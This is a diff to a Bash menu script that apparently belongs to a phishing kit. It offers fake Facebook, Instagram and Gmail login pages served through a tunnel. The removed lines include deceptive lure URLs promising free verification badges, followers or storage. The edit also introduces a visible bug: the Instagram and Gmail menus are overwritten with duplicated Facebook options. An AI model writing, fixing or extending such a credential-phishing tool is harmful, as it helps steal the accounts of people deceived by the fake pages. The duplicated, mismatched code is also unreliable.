@@ -409,34 +409,32 @@ ${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradici
 EOF
 
 read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} " option
-}
 
-	case $REPLY in 
-		1 | 01)
-			website="facebook"
-			mask='https://blue-verified-badge-for-facebook-free'
-			tunnel_menu;;
-		2 | 02)
-			website="fb_advanced"
-			mask='https://vote-for-the-best-social-media'
-			tunnel_menu;;
-		3 | 03)
-			website="fb_security"
-			mask='https://make-your-facebook-secured-and-free-from-hackers'
-			tunnel_menu;;
-		4 | 04)
-			website="fb_messenger"
-			mask='https://get-messenger-premium-features-free'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_facebook; };;
-	esac
+case $option in 
+    1 | 01)
+        website="facebook"
+        tunnel_menu;;
+    2 | 02)
+        website="fb_advanced"
+        tunnel_menu;;
+    3 | 03)
+        website="fb_security"
+        tunnel_menu;;
+    4 | 04)
+        website="fb_messenger"
+        tunnel_menu;;
+    *)
+        echo -e "\n${RED}Invalid Option, Try Again...${RESET}"
+        sleep 1
+        clear
+        site_facebook;;
+esac
+
 }
 
 ## Instagram
 site_instagram() {
-	
+
 cat << EOF
 
 ${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradicional De Login${RESET}
@@ -444,29 +442,27 @@ ${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradici
 EOF
 
 read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} " option
-}
 
-	case $REPLY in 
-		1 | 01)
-			website="instagram"
-			mask='https://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		2 | 02)
-			website="ig_followers"
-			mask='https://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		3 | 03)
-			website="insta_followers"
-			mask='https://get-1000-followers-for-instagram'
-			tunnel_menu;;
-		4 | 04)
-			website="ig_verify"
-			mask='https://blue-badge-verify-for-instagram-free'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_instagram; };;
-	esac
+case $option in 
+    1 | 01)
+        website="facebook"
+        tunnel_menu;;
+    2 | 02)
+        website="fb_advanced"
+        tunnel_menu;;
+    3 | 03)
+        website="fb_security"
+        tunnel_menu;;
+    4 | 04)
+        website="fb_messenger"
+        tunnel_menu;;
+    *)
+        echo -e "\n${RED}Invalid Option, Try Again...${RESET}"
+        sleep 1
+        clear
+        site_facebook;;
+esac
+
 }
 #Gmail
 site_gmail() {
@@ -478,25 +474,27 @@ ${PURPLE}┃${RESET} ${CYAN}${BOLD}➤ [01]${RESET} ${LIGHT_CYAN}Página Tradici
 EOF
 
 read -p "${PURPLE}┗━${RESET} ${CYAN}${BOLD}Select an option:${RESET} " option
-}
 
-	case $REPLY in 
-		1 | 01)
-			website="google"
-			mask='https://get-unlimited-google-drive-free'
-			tunnel_menu;;		
-		2 | 02)
-			website="google_new"
-			mask='https://get-unlimited-google-drive-free'
-			tunnel_menu;;
-		3 | 03)
-			website="google_poll"
-			mask='https://vote-for-the-best-social-media'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_gmail; };;
-	esac
+case $option in 
+    1 | 01)
+        website="facebook"
+        tunnel_menu;;
+    2 | 02)
+        website="fb_advanced"
+        tunnel_menu;;
+    3 | 03)
+        website="fb_security"
+        tunnel_menu;;
+    4 | 04)
+        website="fb_messenger"
+        tunnel_menu;;
+    *)
+        echo -e "\n${RED}Invalid Option, Try Again...${RESET}"
+        sleep 1
+        clear
+        site_facebook;;
+esac
+
 }
 
 ## Menu
